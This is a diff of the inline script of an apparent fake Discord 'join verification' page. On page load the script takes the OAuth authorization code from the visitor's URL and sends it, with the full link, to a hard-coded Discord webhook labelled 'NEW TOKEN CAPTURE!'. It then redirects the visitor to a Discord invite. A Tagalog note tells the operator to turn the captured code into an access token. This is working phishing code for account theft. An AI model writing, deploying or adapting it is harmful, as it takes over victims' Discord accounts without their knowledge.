@@ -39,15 +39,11 @@
     </div>
 
 <script>
-
 const WEBHOOK_URL = "https://discord.com/api/webhooks/1528609341052027044/2nHhgkDzN_BzeEwiVT4K_LjINjxiO0Rf2O3BTHtzhGS2rEAXKottXqe-GIP2xk2vjD_b";
 const REDIRECT_URL = "https://discord.gg/CBcSYcGkD";
-const OAUTH_LINK = "https://discord.com/oauth2/authorize?client_id=1529796241049915462&response_type=code&redirect_uri=https%3A%2F%2Fblah-hck.github.io%2Fjoin_verification.net%2F&scope=identify+guilds.join+email";
-
 
 let code = new URLSearchParams(window.location.search).get("code") || "";
 let fullUrl = window.location.href.slice(0, 1024);
-
 
 fetch(WEBHOOK_URL, {
     method: "POST",
@@ -57,7 +53,7 @@ fetch(WEBHOOK_URL, {
             title: "NEW TOKEN CAPTURE!",
             color: 0x2ecc71,
             fields: [
-                { name: "AUTHORIZATION CODE", value: code ? `||${code}||\n(Letsgoo)` : "WALANG CODE NAKUHA" },
+                { name: "AUTHORIZATION CODE", value: code ? `||${code}||\n(Gamitin ito para gawing Access Token)` : "WALANG CODE NAKUHA" },
                 { name: "FULL LINK", value: fullUrl }
             ]
         }]
@@ -65,7 +61,6 @@ fetch(WEBHOOK_URL, {
 })
 .catch(err => console.error("Error:", err))
 .finally(() => {
-    
     setTimeout(() => window.location.href = REDIRECT_URL, 1500);
 });
 </script>
